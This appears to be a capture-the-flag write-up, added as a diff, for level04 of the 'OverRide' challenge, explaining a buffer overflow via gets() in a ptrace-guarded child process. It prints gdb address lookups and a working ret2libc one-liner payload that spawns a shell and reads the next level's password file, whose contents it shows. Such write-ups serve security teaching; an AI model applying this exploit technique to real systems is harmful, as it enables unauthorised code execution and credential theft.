@@ -1,0 +1,32 @@
+This program create a child process with fork, and trace it with ptrace.
+The parent process wait for the child to finish, and prevent the child to make the syscall exec by killing it immediatly.
+The child process request user for "some shellcode", and then return. We can see in the code a call to gets, which can easily lead to a buffer overflow.
+
+Since we can't make the syscall exec, we will instead call the "system" C function, with a return2libc attack.
+A quick test shows us that the offset from the buffer to the stored eip from main is 156 bytes.
+we need only 3 adresses:
+- the address of the libc system() func.
+- (can be anything) the address of an instruction to execute after the call to system(), we will use the address of libc exit().
+- the address of the string '/bin/sh'.
+
+All those informations can be retrieved with gdb:
+(gdb) p system
+$4 = {<text variable, no debug info>} 0xf7e6aed0 <system>
+(gdb) p exit
+$5 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
+(gdb) find __libc_start_main,+99999999,"/bin/sh"
+0xf7f897ec
+warning: Unable to access target memory at 0xf7fd3b74, halting search.
+1 pattern found.
+
+putting all those informations together, here is the result:
+
+level04@OverRide:~$ (python -c "print 156 * 'A' + '\xf7\xe6\xae\xd0'[::-1] + '\xf7\xe5\xeb\x70'[::-1] + '\xf7\xf8\x97\xec'[::-1]" ; cat) |./level04
+Give me some shellcode, k
+whoami
+level05
+cd /home/users/level05
+cat .pass
+3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
+^C
+level04@OverRide:~$
